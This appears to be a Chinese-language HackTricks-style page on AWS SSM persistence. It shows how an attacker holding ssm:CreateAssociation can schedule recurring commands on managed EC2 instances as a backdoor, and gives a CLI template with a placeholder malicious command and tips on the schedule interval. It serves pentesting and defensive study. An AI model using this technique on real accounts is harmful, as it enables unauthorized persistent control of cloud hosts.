# AWS - SSM 持久性

{{#include ../../../banners/hacktricks-training.md}}

## SSM

有关更多信息，请查看：

{{#ref}}
../aws-services/aws-ec2-ebs-elb-ssm-vpc-and-vpn-enum/README.md
{{#endref}}

### 使用 ssm:CreateAssociation 实现持久性

具有权限 **`ssm:CreateAssociation`** 的攻击者可以创建一个状态管理器关联，以自动在由 SSM 管理的 EC2 实例上执行命令。这些关联可以配置为在固定间隔内运行，使其适合于类似后门的持久性，而无需交互式会话。
```bash
aws ssm create-association \
--name SSM-Document-Name \
--targets Key=InstanceIds,Values=target-instance-id \
--parameters commands=["malicious-command"] \
--schedule-expression "rate(30 minutes)" \
--association-name association-name
```
> [!NOTE]
> 这种持久性方法只要 EC2 实例由 Systems Manager 管理，SSM 代理正在运行，并且攻击者有权限创建关联，就可以工作。它不需要交互式会话或明确的 ssm:SendCommand 权限。**重要：** `--schedule-expression` 参数（例如，`rate(30 minutes)`）必须遵守 AWS 的最小间隔 30 分钟。对于立即或一次性执行，完全省略 `--schedule-expression` — 关联将在创建后执行一次。

{{#include ../../../banners/hacktricks-training.md}}
